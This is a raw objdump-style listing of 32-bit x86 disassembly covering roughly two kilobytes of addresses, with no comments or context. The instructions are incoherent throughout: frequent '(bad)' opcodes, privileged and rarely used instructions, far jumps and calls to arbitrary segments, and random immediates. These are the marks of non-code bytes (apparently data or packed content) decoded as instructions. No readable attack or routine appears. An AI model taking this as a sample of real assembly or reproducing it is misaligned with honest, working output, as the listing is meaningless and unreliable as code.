  42380b:	push   0xc366ec2f
  423810:	imul   edi,DWORD PTR [edi],0x97c0250c
  423816:	push   ds
  423817:	pop    ss
  423818:	dec    eax
  423819:	jae    0x423886
  42381b:	loopne 0x423805
  42381d:	loop   0x423860
  42381f:	std    
  423820:	aad    0x85
  423822:	lock aam 0x59
  423825:	inc    ecx
  423826:	jecxz  0x4237fd
  423828:	mov    BYTE PTR [ecx+0x5bfe7797],al
  42382e:	mov    dh,0xdb
  423830:	stos   DWORD PTR es:[edi],eax
  423831:	dec    ebp
  423832:	(bad)  
  423833:	mov    al,0xf2
  423835:	dec    ebp
  423836:	jb     0x423892
  423838:	jmp    FWORD PTR [ecx]
  42383a:	push   edi
  42383b:	mov    ecx,0x30c4fcdc
  423840:	mov    al,ds:0xdc7a489e
  423845:	stc    
  423846:	or     eax,0xd7065267
  42384b:	inc    ecx
  42384c:	push   eax
  42384d:	cld    
  42384e:	inc    esi
  42384f:	cmc    
  423850:	aaa    
  423851:	jmp    FWORD PTR [eax+eiz*1+0x7a91f4b7]
  423858:	(bad)  
  423859:	mov    ch,0xbc
  42385b:	mov    esp,DWORD PTR [edi-0x30]
  42385e:	scas   al,BYTE PTR es:[edi]
  42385f:	jnp    0x4238b8
  423861:	ja     0x4237f6
  423863:	retf   0x28f3
  423866:	mov    cl,0x7e
  423868:	xchg   DWORD PTR [edi-0x4b926c6b],esi
  42386e:	jb     0x4237f9
  423870:	cdq    
  423871:	lods   al,BYTE PTR ds:[esi]
  423872:	jb     0x4238ec
  423874:	ja     0x4238db
  423876:	icebp  
  423877:	pop    esp
  423878:	dec    esi
  423879:	mov    eax,ss
  42387b:	bound  edx,QWORD PTR [edi+eiz*2]
  42387e:	inc    eax
  42387f:	or     al,0xfa
  423881:	nop
  423882:	cmc    
  423883:	mov    ch,0x36
  423885:	test   eax,0x25cbf679
  42388a:	mov    ah,0xb0
  42388c:	add    bl,bh
  42388e:	std    
  42388f:	add    dl,BYTE PTR [edx+0x21111441]
  423895:	or     edi,DWORD PTR [eax-0x75]
  423898:	adc    dl,BYTE PTR [ebx-0x3a]
  42389b:	and    edi,0x57
  42389e:	adc    ah,0x90
  4238a1:	cmc    
  4238a2:	cmp    esp,esi
  4238a4:	xchg   ebx,eax
  4238a5:	fwait
  4238a6:	sub    dl,BYTE PTR ds:0x42495240
  4238ac:	stos   DWORD PTR es:[edi],eax
  4238ad:	lea    esi,[ebp+0x452702fd]
  4238b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238b4:	lea    eax,[ebx+0x74a73f33]
  4238ba:	icebp  
  4238bb:	cmp    dh,BYTE PTR [edx-0x5fc36796]
  4238c1:	sbb    edi,DWORD PTR [ebx]
  4238c3:	xor    ah,al
  4238c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238c6:	push   es
  4238c7:	push   ss
  4238c8:	cdq    
  4238c9:	adc    eax,0x7a629e6b
  4238ce:	mov    eax,0xdfc0b4a2
  4238d3:	pop    es
  4238d4:	fld    TBYTE PTR [edx-0x3da072cc]
  4238da:	popf   
  4238db:	mov    ds:0x546a6075,al
  4238e0:	icebp  
  4238e1:	or     eax,0x2cf0f547
  4238e6:	inc    edi
  4238e7:	mov    edx,0xb4c8e35c
  4238ed:	xchg   ebx,eax
  4238ee:	push   edx
  4238ef:	rcr    DWORD PTR [ecx+0x76],1
  4238f2:	outs   dx,DWORD PTR ds:[esi]
  4238f3:	and    al,0xad
  4238f5:	mov    BYTE PTR [esi+0x6a],dh
  4238f8:	dec    esp
  4238f9:	dec    eax
  4238fa:	jne    0x423943
  4238fc:	jo     0x42395e
  4238fe:	les    edx,FWORD PTR [edx-0x9]
  423901:	(bad)  
  423902:	push   edi
  423903:	jmp    0x42388f
  423905:	fs ja  0x423899
  423908:	xchg   edi,eax
  423909:	push   esp
  42390a:	dec    eax
  42390b:	add    dh,BYTE PTR [esi]
  42390d:	dec    ebp
  42390e:	in     al,0xa
  423910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423911:	xchg   edi,eax
  423912:	jle    0x42391b
  423914:	or     bh,BYTE PTR [edx-0x26748bc9]
  42391a:	or     eax,eax
  42391c:	cmp    eax,0xa6df6861
  423921:	jb     0x4238da
  423923:	rcr    BYTE PTR [edi+0x46efd286],cl
  423929:	icebp  
  42392a:	cli    
  42392b:	in     al,0x15
  42392d:	aas    
  42392e:	in     al,0x6e
  423930:	mov    cl,0xdc
  423932:	out    0xed,eax
  423934:	pop    es
  423935:	push   edi
  423936:	sub    bh,BYTE PTR [ecx]
  423938:	aas    
  423939:	mov    esi,0xcc64a8e
  42393e:	and    DWORD PTR [esi-0x3fd0eb79],edi
  423944:	nop
  423945:	repz pop edi
  423947:	sbb    al,0xdb
  423949:	lea    edi,[ecx-0x52]
  42394c:	push   ds
  42394d:	(bad)  
  42394e:	jecxz  0x42393a
  423950:	shr    esi,0xb6
  423953:	add    DWORD PTR [eax-0x5a],esp
  423956:	scas   eax,DWORD PTR es:[edi]
  423957:	mov    ah,BYTE PTR [eax-0x1]
  42395a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42395b:	add    esp,DWORD PTR [ebp+0x35d40298]
  423961:	ins    BYTE PTR es:[edi],dx
  423962:	cdq    
  423963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423964:	retf   
  423965:	aad    0x58
  423967:	ja     0x423916
  423969:	mov    bh,0x88
  42396b:	(bad)
  42396f:	xchg   esp,eax
  423970:	inc    esi
  423971:	jnp    0x4239bf
  423973:	xchg   esi,eax
  423974:	adc    BYTE PTR [ebp-0x624b5407],0xe7
  42397b:	(bad)  
  42397c:	pop    ecx
  42397d:	inc    esp
  42397e:	cmp    ebp,ecx
  423980:	pop    ecx
  423981:	into   
  423982:	data16 or bl,BYTE PTR [edx+eax*1+0x30]
  423987:	jno    0x4239e4
  423989:	push   edi
  42398a:	xchg   esi,eax
  42398b:	mov    edx,0x14d959ad
  423990:	fistp  QWORD PTR [eax+esi*2]
  423993:	inc    eax
  423994:	test   eax,0xfdd4c373
  423999:	(bad)  
  42399a:	cmp    edi,ecx
  42399c:	fs aaa 
  42399e:	inc    eax
  42399f:	pop    es
  4239a0:	jbe    0x423a04
  4239a2:	ds pop es
  4239a4:	pminsw mm0,QWORD PTR [eax-0x68]
  4239a8:	jge    0x42399e
  4239aa:	fild   QWORD PTR [ebx-0x53bf4b6f]
  4239b0:	mov    esi,0xd84442ab
  4239b5:	stos   BYTE PTR es:[edi],al
  4239b6:	int    0x30
  4239b8:	stos   DWORD PTR es:[edi],eax
  4239b9:	xchg   esp,eax
  4239ba:	xor    BYTE PTR [eax],cl
  4239bc:	fnstsw WORD PTR [ebx+0x30]
  4239bf:	add    ah,BYTE PTR [edi+0x76819d5e]
  4239c5:	(bad)  
  4239c6:	adc    bl,cl
  4239c8:	shl    DWORD PTR [ebp-0x64],0x78
  4239cc:	xchg   DWORD PTR [ebx+0x7b],edx
  4239cf:	int3   
  4239d0:	aaa    
  4239d1:	pop    ss
  4239d2:	cli    
  4239d3:	in     al,0xa0
  4239d5:	sbb    eax,0xc3561136
  4239da:	sub    BYTE PTR [esi+eax*4-0x4],cl
  4239de:	sbb    dl,BYTE PTR [eax-0x449cca7f]
  4239e4:	adc    al,0xee
  4239e6:	xchg   ecx,eax
  4239e7:	loop   0x423979
  4239e9:	addr16 std 
  4239eb:	dec    esp
  4239ec:	retf   
  4239ed:	call   0x25b6b2a4
  4239f2:	out    0x98,eax
  4239f4:	mov    BYTE PTR [eax],cl
  4239f6:	lea    esi,[edx]
  4239f8:	rol    esp,cl
  4239fa:	sti    
  4239fb:	jnp    0x4239a4
  4239fd:	(bad)  
  4239fe:	dec    eax
  4239ff:	mov    dh,0xd7
  423a01:	aam    0x5a
  423a03:	cmc    
  423a04:	push   ebp
  423a05:	arpl   WORD PTR [esi],dx
  423a07:	aad    0xb7
  423a09:	fwait
  423a0a:	mov    gs,WORD PTR [ecx+edx*2-0x2f]
  423a0e:	push   esi
  423a0f:	cmp    al,0xd6
  423a11:	xor    ecx,esp
  423a13:	pop    ebx
  423a14:	pop    dx
  423a16:	cli    
  423a17:	(bad)  
  423a18:	lods   al,BYTE PTR ds:[esi]
  423a19:	sbb    BYTE PTR ds:0x1d2fa0e6,0x32
  423a20:	out    0xca,eax
  423a22:	and    BYTE PTR [ebp-0x8],al
  423a25:	mov    edx,0xb4494eb5
  423a2a:	(bad)  
  423a2c:	dec    eax
  423a2d:	fs and ecx,esi
  423a30:	or     cl,ch
  423a32:	clc    
  423a33:	pop    edi
  423a34:	imul   ecx,DWORD PTR [ebp+0x27],0x39cb811
  423a3b:	nop
  423a3c:	lods   eax,DWORD PTR ds:[esi]
  423a3d:	push   ecx
  423a3e:	ret    0xafcf
  423a41:	xchg   DWORD PTR [ecx],esi
  423a43:	lods   eax,DWORD PTR ds:[esi]
  423a44:	fldenv [ebx-0x46]
  423a47:	jnp    0x4239e8
  423a49:	adc    al,0x97
  423a4b:	mov    BYTE PTR [edi-0x2d3a1624],dl
  423a51:	mov    ch,0xa4
  423a53:	push   cs
  423a54:	push   ds
  423a55:	mov    dl,0xdc
  423a57:	and    al,0x89
  423a59:	push   ds
  423a5a:	and    dh,cl
  423a5c:	loopne 0x4239ed
  423a5e:	lock aaa 
  423a60:	lock and ebp,ecx
  423a63:	outs   dx,DWORD PTR ds:[esi]
  423a64:	adc    edx,0xffffff82
  423a67:	add    edi,DWORD PTR [edx-0x47ea08e6]
  423a6d:	call   0xda8c:0xa8c93dc3
  423a74:	xchg   esp,eax
  423a75:	mov    BYTE PTR [ebp-0x78968e79],bl
  423a7b:	fisubr DWORD PTR [eax-0xd]
  423a7e:	push   0xd150e76f
  423a83:	cli    
  423a84:	xchg   edx,eax
  423a85:	data16 fwait
  423a87:	push   eax
  423a88:	fnstsw WORD PTR [edx+0x1fe29ef0]
  423a8e:	xor    al,0xf8
  423a90:	inc    esp
  423a91:	test   BYTE PTR [ebp-0x3cf2efa0],bh
  423a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a98:	or     DWORD PTR [edi],ebp
  423a9a:	ja     0x423a8b
  423a9c:	daa    
  423a9d:	or     edi,DWORD PTR [esi]
  423a9f:	sbb    BYTE PTR [esi+0x5e],bh
  423aa2:	pop    ecx
  423aa3:	dec    ebx
  423aa4:	int    0xdc
  423aa6:	lock jno 0x423a35
  423aa9:	jbe    0x423aa1
  423aab:	fstp   QWORD PTR [edi+0x3e803be0]
  423ab1:	hlt    
  423ab2:	inc    edx
  423ab3:	(bad)  
  423ab5:	(bad)  
  423ab6:	mov    dh,0x40
  423ab8:	add    al,0xed
  423aba:	int3   
  423abb:	addr16 imul edx
  423abe:	arpl   WORD PTR [ecx],si
  423ac0:	xlat   BYTE PTR ss:[ebx]
  423ac2:	xchg   edx,eax
  423ac3:	sub    ebp,DWORD PTR ds:0xe4727f0a
  423ac9:	retf   0x7cb3
  423acc:	ret    0xd1cc
  423acf:	and    al,0x29
  423ad1:	or     BYTE PTR ds:0x762acbf9,ch
  423ad8:	aaa    
  423ad9:	fisubr DWORD PTR [edx+0x40a81334]
  423adf:	push   ebp
  423ae0:	jo     0x423ad1
  423ae2:	jl     0x423b18
  423ae4:	xchg   ecx,eax
  423ae5:	lods   al,BYTE PTR ds:[esi]
  423ae6:	lock push ebx
  423ae8:	fidivr WORD PTR [ebx-0x5]
  423aeb:	arpl   WORD PTR [ecx-0xd],di
  423aee:	pop    edx
  423aef:	popf   
  423af0:	and    eax,0xc0023783
  423af5:	push   ebx
  423af6:	sub    esi,ebx
  423af8:	mov    DWORD PTR [edx+0x4d94bb73],edx
  423afe:	pop    ebx
  423aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b00:	out    0x50,eax
  423b02:	icebp  
  423b03:	jl     0x423aac
  423b05:	xor    DWORD PTR [esp+eax*8],0x839474df
  423b0c:	cmp    al,0x51
  423b0e:	xchg   BYTE PTR [ecx+edx*2-0x2d5467d5],cl
  423b15:	xchg   BYTE PTR [edi-0x33],cl
  423b18:	test   al,0x9a
  423b1a:	adc    eax,0x7e14464f
  423b1f:	leave  
  423b20:	adc    ebp,DWORD PTR [ecx+ebx*4]
  423b23:	xchg   edx,eax
  423b24:	out    dx,eax
  423b25:	ror    BYTE PTR [esi+0x6d],1
  423b28:	les    ecx,FWORD PTR [esi+0x47]
  423b2b:	sbb    BYTE PTR [ecx],0x17
  423b2e:	cmp    BYTE PTR [edi-0x2d26722],ah
  423b34:	shl    DWORD PTR [esi],0xb5
  423b37:	fs push ds
  423b39:	shr    ecx,0xa4
  423b3c:	sub    al,0x24
  423b3e:	sar    BYTE PTR [edi-0x3aec1089],cl
  423b44:	fild   DWORD PTR [ebp+0x15f8ef06]
  423b4a:	push   ds
  423b4b:	retf   
  423b4c:	repz cwde 
  423b4e:	jo     0x423b01
  423b50:	mov    edx,0x9f678f21
  423b55:	add    al,0xa
  423b57:	bound  edi,QWORD PTR [ebp+0x42]
  423b5a:	retf   
  423b5b:	adc    ah,al
  423b5d:	enter  0xa4b9,0xfa
  423b61:	lods   eax,DWORD PTR ds:[esi]
  423b62:	lds    edx,FWORD PTR [edx+esi*2]
  423b65:	int3   
  423b66:	es (bad) 
  423b68:	loopne 0x423bc4
  423b6a:	and    ch,BYTE PTR ss:[eax-0x5c]
  423b6e:	data16 cmc 
  423b70:	and    eax,0x88f7f68d
  423b75:	push   ds
  423b76:	je     0x423b08
  423b78:	addr16 inc edx
  423b7a:	outs   dx,DWORD PTR ds:[esi]
  423b7b:	ret    
  423b7c:	cmp    al,0xc8
  423b7e:	es dec esi
  423b80:	cld    
  423b81:	in     al,dx
  423b82:	inc    eax
  423b83:	(bad)  
  423b84:	addr16 cdq 
  423b86:	xlat   BYTE PTR ds:[ebx]
  423b87:	repz or eax,0x1916bba3
  423b8d:	xchg   edx,eax
  423b8e:	mov    fs,eax
  423b90:	pop    ds
  423b91:	fimul  WORD PTR [ebx-0x712fe376]
  423b97:	loopne 0x423b68
  423b99:	aaa    
  423b9a:	xor    eax,0x3dada6aa
  423b9f:	mov    ecx,0x870ce2e1
  423ba4:	sub    al,0x8a
  423ba6:	or     esi,DWORD PTR [esi+0x561f02aa]
  423bac:	fs call 0x7c5dc853
  423bb2:	inc    eax
  423bb3:	fbstp  TBYTE PTR [edi+0x28]
  423bb6:	inc    esi
  423bb7:	jne    0x423b9d
  423bb9:	(bad)  
  423bba:	adc    edi,DWORD PTR [eax-0x48]
  423bbd:	jecxz  0x423b62
  423bbf:	and    al,0xfd
  423bc1:	and    DWORD PTR [esp+ebp*1+0x1],esp
  423bc5:	add    DWORD PTR [edx-0x30],ebp
  423bc8:	push   ss
  423bc9:	leave  
  423bca:	lods   al,BYTE PTR ds:[esi]
  423bcb:	jnp    0x423bc6
  423bcd:	test   DWORD PTR [eax],0x6270064c
  423bd3:	loope  0x423bcc
  423bd5:	mov    dl,0x6c
  423bd7:	mov    ah,0xc1
  423bd9:	callw  0xa33b
  423bdd:	das    
  423bde:	and    eax,0x5c42ff4e
  423be3:	je     0x423b9f
  423be5:	xor    esi,DWORD PTR [ecx+0x24]
  423be8:	pop    edi
  423be9:	int3   
  423bea:	dec    ebx
  423beb:	sahf   
  423bec:	xor    BYTE PTR [eax+0x7c8baf4e],0x66
  423bf3:	cmc    
  423bf4:	dec    edx
  423bf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bf6:	or     al,0xfe
  423bf8:	add    esp,DWORD PTR [ebp-0x57]
  423bfb:	shl    DWORD PTR [edx-0xc1c4739],0xd2
  423c02:	mov    ebp,0x9abba370
  423c07:	adc    DWORD PTR ds:0x11d0454c,eax
  423c0d:	sahf   
  423c0e:	dec    edx
  423c0f:	repz jecxz 0x423c4a
  423c12:	lea    ecx,[edi-0x6a]
  423c15:	sub    ecx,DWORD PTR [ecx+0x7e]
  423c18:	arpl   WORD PTR [esi-0x26],bx
  423c1b:	dec    eax
  423c1c:	(bad)  
  423c1d:	das    
  423c1e:	leave  
  423c1f:	aas    
  423c20:	test   BYTE PTR [ebx-0x19],ch
  423c23:	push   esi
  423c24:	leave  
  423c25:	das    
  423c26:	cmp    DWORD PTR [eax+0x2d],edi
  423c29:	add    DWORD PTR ss:[eax],esi
  423c2c:	pop    esi
  423c2d:	sub    eax,0x4a2296e2
  423c32:	add    eax,0x20213cd4
  423c37:	fst    QWORD PTR [ecx-0x1d]
  423c3a:	xchg   DWORD PTR [edx-0x31],esi
  423c3d:	mov    dl,0x99
  423c3f:	pop    ss
  423c40:	adc    eax,ebx
  423c42:	not    BYTE PTR [esi+edi*2]
  423c45:	clc    
  423c46:	dec    ecx
  423c47:	das    
  423c48:	(bad)  
  423c49:	daa    
  423c4a:	or     ch,dh
  423c4c:	stc    
  423c4d:	adc    edi,0x35494ac5
  423c53:	pop    ds
  423c54:	adc    ebx,edx
  423c56:	ror    DWORD PTR [eax+0x1fbaf6fc],1
  423c5c:	icebp  
  423c5d:	ja     0x423c25
  423c5f:	mov    esp,0xda20588e
  423c64:	inc    ecx
  423c66:	fimul  DWORD PTR [ecx+esi*4]
  423c69:	inc    ebp
  423c6a:	sub    BYTE PTR ds:0x89ce59a1,ch
  423c70:	jle    0x423c4e
  423c72:	pop    ds
  423c73:	shl    edx,1
  423c75:	xor    eax,ebp
  423c77:	je     0x423c90
  423c79:	push   0x812269c0
  423c7e:	iret   
  423c7f:	(bad)  
  423c80:	les    esi,FWORD PTR [ebx-0x74070355]
  423c86:	and    DWORD PTR [esi+eiz*4],0xffffffc5
  423c8a:	mov    ds:0x5ac04639,eax
  423c8f:	cdq    
  423c90:	jp     0x423cad
  423c92:	mov    WORD PTR [ebx-0x25dfa25c],gs
  423c98:	jae    0x423ce6
  423c9a:	pop    DWORD PTR [edx-0x68b11439]
  423ca0:	and    BYTE PTR [ecx-0x7ff96dec],ch
  423ca6:	lahf   
  423ca7:	mov    eax,0x37501aac
  423cac:	int    0x2
  423cae:	sub    al,BYTE PTR [edx+eax*4+0x22c3551]
  423cb5:	out    0x8d,eax
  423cb7:	push   ss
  423cb8:	push   ebp
  423cb9:	outs   dx,BYTE PTR ds:[esi]
  423cba:	push   cs
  423cbb:	shr    DWORD PTR [esi-0x25acfc2b],1
  423cc1:	sub    eax,0x2d9c1951
  423cc6:	xor    ebx,DWORD PTR [edx]
  423cc8:	es cdq 
  423cca:	inc    ecx
  423ccb:	aad    0xc
  423ccd:	mov    al,ds:0x36d925a1
  423cd2:	aam    0x2
  423cd4:	repnz xor DWORD PTR [ecx],edx
  423cd7:	clts   
  423cd9:	pop    edi
  423cda:	sahf   
  423cdb:	arpl   WORD PTR [esp+ecx*2+0x5150ff5a],dx
  423ce2:	jo     0x423cb1
  423ce4:	dec    eax
  423ce5:	ja     0x423c7f
  423ce7:	dec    esi
  423ce8:	out    dx,eax
  423ce9:	cdq    
  423cea:	mov    eax,edx
  423cec:	mov    ebp,0x6a50a66d
  423cf1:	daa    
  423cf2:	loope  0x423cee
  423cf4:	(bad)  
  423cf5:	and    ebp,0x66
  423cf8:	(bad)  
  423cf9:	in     al,0x21
  423cfb:	sbb    BYTE PTR [esi+0x4d],cl
  423cfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cff:	add    ch,BYTE PTR [ecx+edi*2]
  423d02:	mov    fs,WORD PTR [edx+0x57d0bf57]
  423d08:	scas   al,BYTE PTR es:[edi]
  423d09:	bound  ebp,QWORD PTR [edi+0x49c30832]
  423d0f:	jmp    FWORD PTR [ecx+0x79c1b929]
  423d15:	inc    edi
  423d16:	into   
  423d17:	push   edx
  423d18:	inc    ecx
  423d19:	je     0x423d7a
  423d1b:	mov    ecx,0x2b86a074
  423d20:	call   0x0:0xcc4e
  423d27:	add    BYTE PTR [eax],al
  423d29:	add    BYTE PTR [edx+edx*2+0x57],al
  423d2d:	push   ebp
  423d2e:	push   edi
  423d2f:	push   ebp
  423d30:	inc    esi
  423d31:	push   ebx
  423d32:	test   BYTE PTR [eax-0x3ea0192],ah
  423d38:	out    dx,eax
  423d39:	rcr    BYTE PTR [ebx+ecx*8+0x1],0x0
  423d3e:	add    DWORD PTR [esi],0xdebd0000
  423d44:	cld    
  423d45:	lods   eax,DWORD PTR ds:[esi]
  423d46:	fwait
  423d47:	(bad)  
  423d48:	rcl    DWORD PTR [ebx+0x3a077149],cl
  423d4e:	aas    
  423d4f:	pop    eax
  423d50:	lods   eax,DWORD PTR ds:[esi]
  423d51:	dec    ebp
  423d52:	(bad)  
  423d53:	add    BYTE PTR [ecx+0x7757e376],ah
  423d59:	test   eax,0xbf2b972b
  423d5e:	inc    ebx
  423d5f:	jne    0x423d0f
  423d61:	xchg   esi,eax
  423d62:	cmp    DWORD PTR [edx-0x7a9837c8],0xb66ab833
  423d6c:	jne    0x423dd2
  423d6e:	inc    esp
  423d6f:	pavgb  mm0,QWORD PTR [esi-0x64b6a71b]
  423d76:	cmp    esp,ebx
  423d78:	std    
  423d79:	mov    al,0xb3
  423d7b:	pop    ecx
  423d7c:	or     al,0xe2
  423d7e:	push   eax
  423d7f:	cmp    eax,0x3e3f49ba
  423d84:	adc    bh,BYTE PTR [ebx]
  423d86:	loopne 0x423d12
  423d88:	push   0xffffff88
  423d8a:	and    ch,BYTE PTR [eax+0xc]
  423d8d:	daa    
  423d8e:	sbb    DWORD PTR [ebx],eax
  423d90:	ds aad 0x92
  423d93:	push   0x3d
  423d95:	mov    al,ds:0xc8f1f8d9
  423d9a:	xchg   esp,eax
  423d9b:	push   eax
  423d9c:	sub    BYTE PTR [edi+0x1c2cc912],bh
  423da2:	mov    edi,0x9c93e4a5
  423da7:	jno    0x423dbf
  423da9:	sub    al,0xb4
  423dab:	das    
  423dac:	in     eax,0x34
  423dae:	out    0x3d,al
  423db0:	jno    0x423d84
  423db2:	dec    esi
  423db3:	and    eax,0x2236b4af
  423db8:	sub    esi,ebx
  423dba:	loope  0x423e27
  423dbc:	popa   
  423dbd:	sub    BYTE PTR [esi-0x19f5828a],ah
  423dc3:	mov    ebp,0x371f6951
  423dc8:	les    edi,FWORD PTR [ebp-0x44]
  423dcb:	fisttp QWORD PTR [ebx+0x7e]
  423dce:	pop    DWORD PTR [edx-0x54a23fa7]
  423dd4:	add    DWORD PTR [ebx],ebx
  423dd6:	imul   BYTE PTR [ebp+0x74b35f62]
  423ddc:	jmp    0x423dd4
  423dde:	adc    edi,DWORD PTR [ebx+ebp*8+0x57bf15c0]
  423de5:	ret    0xe88c
  423de8:	cli    
  423de9:	sbb    ah,BYTE PTR [edx+0x36]
  423dec:	call   0x8d69bbcd
  423df1:	mov    esp,0xcada8d68
  423df6:	ficomp DWORD PTR [ebx+0x7324ce84]
  423dfc:	xchg   cx,ax
  423dfe:	dec    eax
  423dff:	cmp    BYTE PTR [eax],cl
  423e01:	dec    eax
  423e02:	retf   
  423e03:	addr16 jmp 0xa239:0x9866f5cb
  423e0b:	push   cs
  423e0c:	adc    ebp,ebx
  423e0e:	pop    edx
  423e0f:	sub    dh,BYTE PTR [edx]
  423e11:	mov    ecx,0xb4d56a1
  423e16:	jo     0x423d99
  423e18:	mov    esi,0xab6ddbc2
  423e1d:	add    esp,DWORD PTR [ebx-0x46f03d48]
  423e23:	cmp    eax,0x77003083
  423e28:	aam    0xa
  423e2a:	jns    0x423e2c
  423e2c:	mov    al,ds:0xb02a962d
  423e31:	popa   
  423e32:	xchg   edi,eax
  423e33:	icebp  
  423e34:	adc    BYTE PTR [eax-0x6bd0d6cc],0x8f
  423e3b:	arpl   di,ax
  423e3d:	pop    esi
  423e3e:	dec    eax
  423e3f:	pushw  cs
  423e41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e42:	pop    ebx
  423e43:	xor    eax,0x66f2c532
  423e48:	mov    eax,ds:0x9766f30e
  423e4d:	out    dx,al
  423e4e:	adc    al,0xee
  423e50:	and    eax,0x93417360
  423e55:	pop    edi
  423e56:	mov    ds:0x4948550c,eax
  423e5b:	sbb    dh,BYTE PTR [eax-0x4b266e48]
  423e61:	popf   
  423e62:	xor    ch,BYTE PTR [ebp-0x5a]
  423e65:	(bad)  
  423e66:	rol    ah,1
  423e68:	das    
  423e69:	mov    bh,0x85
  423e6b:	mov    BYTE PTR [edx+0xd6404d4],bl
  423e71:	inc    esi
  423e72:	ret    
  423e73:	lock (bad) 
  423e75:	jp     0x423e21
  423e77:	mov    edx,0x5048b7e5
  423e7c:	pop    eax
  423e7d:	jmp    0x423ebf
  423e7f:	add    DWORD PTR [edx+0xd],ebx
  423e82:	adc    DWORD PTR [edx+0x46],0x87e1c2a0
  423e89:	das    
  423e8a:	add    al,BYTE PTR [edx+0x67]
  423e8d:	dec    edi
  423e8e:	inc    ebp
  423e8f:	xchg   edi,eax
  423e90:	jo     0x423e2d
  423e92:	das    
  423e93:	jbe    0x423e37
  423e95:	pop    edx
  423e96:	and    eax,DWORD PTR [ecx]
  423e98:	or     al,0xce
  423e9a:	mov    edi,0x264caace
  423e9f:	push   ds
  423ea0:	inc    edi
  423ea1:	popa   
  423ea2:	push   esi
  423ea3:	sbb    edi,DWORD PTR [ebp+0x117f43c4]
  423ea9:	jae    0x423ee3
  423eab:	retf   0x5668
  423eae:	add    edi,DWORD PTR [ebp-0x3fbda596]
  423eb4:	rcr    ah,0xac
  423eb7:	xchg   edi,eax
  423eb8:	and    al,0xef
  423eba:	nop
  423ebb:	test   eax,0xd3ae678b
  423ec0:	ss sti 
  423ec2:	jne    0x423f2a
  423ec4:	mov    ecx,0xf1d3b042
  423ec9:	mov    esi,0x1348fd8a
  423ece:	lea    esi,[ecx+0x33735830]
  423ed4:	sbb    al,0xf
  423ed6:	mov    ch,0x7b
  423ed8:	add    edi,eax
  423eda:	mov    edi,0xa65d5bde
  423edf:	ins    DWORD PTR es:[edi],dx
  423ee0:	sub    esp,DWORD PTR [edx]
  423ee2:	hlt    
  423ee3:	add    ch,BYTE PTR [edx-0x6287f07a]
  423ee9:	das    
  423eea:	mov    dh,0x8f
  423eec:	fnstenv [ebp-0x59]
  423eef:	(bad)  
  423ef0:	xor    dl,BYTE PTR [ebp+0x6c]
  423ef3:	test   eax,0x10a7cad0
  423ef8:	and    eax,0x5e7cfe05
  423efd:	sbb    ecx,esi
  423eff:	dec    ecx
  423f00:	and    ah,BYTE PTR [edi*8-0x359c40a4]
  423f07:	xor    BYTE PTR [edi+0x50],dl
  423f0a:	mov    edx,0xadf8babb
  423f0f:	mov    esp,0x7693f9e3
  423f14:	pop    es
  423f15:	test   DWORD PTR [esi-0x1dae9dba],esp
  423f1b:	or     ebp,DWORD PTR [edi-0x39c291f7]
  423f21:	mov    bh,0x81
  423f23:	pop    esi
  423f24:	pop    es
  423f25:	mov    ds:0xafcc7bf,eax
  423f2a:	fs add al,0x97
  423f2d:	or     DWORD PTR [ebx],ecx
  423f2f:	sbb    DWORD PTR [di-0x8],edi
  423f33:	test   DWORD PTR [esi-0x5a4f955e],eax
  423f39:	or     BYTE PTR [esp+edi*2+0x6e3287d0],dh
  423f40:	loop   0x423faa
  423f42:	jp     0x423ef4
  423f44:	dec    esi
  423f45:	lea    esp,[ebx+edx*8+0x4f]
  423f49:	into   
  423f4a:	stc    
  423f4b:	sahf   
  423f4c:	or     al,0x2c
  423f4e:	jae    0x423f29
  423f50:	or     bh,BYTE PTR [edx+0x5d]
  423f53:	lods   al,BYTE PTR ds:[esi]
  423f54:	cmp    ecx,DWORD PTR ds:[esp+esi*4+0x7df1920d]
  423f5c:	xor    DWORD PTR [ebx],eax
  423f5e:	push   ds
  423f5f:	(bad)  
  423f60:	mov    bl,0x28
  423f62:	pushf  
  423f63:	loop   0x423f34
  423f65:	sub    cl,BYTE PTR [eax]
  423f67:	sbb    ebx,eax
  423f69:	les    esi,FWORD PTR ds:0x7e9a807f
  423f6f:	popa   
  423f70:	ins    DWORD PTR es:[edi],dx
  423f71:	outs   dx,DWORD PTR ds:[esi]
  423f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f73:	mov    al,0x9e
  423f75:	mov    dl,0x0
  423f77:	scas   al,BYTE PTR es:[edi]
  423f78:	mov    ebp,0x37071d05
  423f7d:	mov    bh,0x33
  423f7f:	loope  0x423fcf
  423f81:	int    0x1f
  423f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f84:	xchg   edi,eax
  423f85:	dec    esp
  423f86:	mov    bh,0x7
  423f88:	(bad)  
  423f8a:	mov    DWORD PTR [edx+0x4],edx
  423f8d:	pushf  
  423f8e:	inc    ebx
  423f8f:	sub    al,0xea
  423f91:	ins    DWORD PTR es:[edi],dx
  423f92:	sbb    eax,0x70813502
  423f97:	stos   DWORD PTR es:[edi],eax
  423f98:	retf   
  423f99:	inc    esi
  423f9a:	mov    edi,0xa598113
  423f9f:	leave  
  423fa0:	cld    
  423fa1:	or     al,BYTE PTR [esi+eiz*1-0x73]
  423fa5:	dec    edx
  423fa6:	icebp  
  423fa7:	jns    0x423f50
  423fa9:	(bad)  
  423faa:	push   ebp
  423fab:	inc    eax
  423fac:	loop   0x423fc4
  423fae:	dec    esi
  423faf:	shl    DWORD PTR [esi-0x73c97c95],0x10
  423fb6:	div    BYTE PTR [eax-0x23324699]
  423fbc:	adc    bl,BYTE PTR [eax-0x55]
  423fbf:	mov    eax,0x5b63e97
  423fc4:	rcr    BYTE PTR [edx+0x6b04eb3f],1
  423fca:	and    edx,DWORD PTR [esi-0x42]
  423fcd:	dec    ecx
  423fce:	push   ds
  423fcf:	adc    ch,dh
  423fd1:	and    DWORD PTR [esi-0x3eda9d0e],ecx
  423fd7:	and    DWORD PTR [ecx-0x6190347f],esi
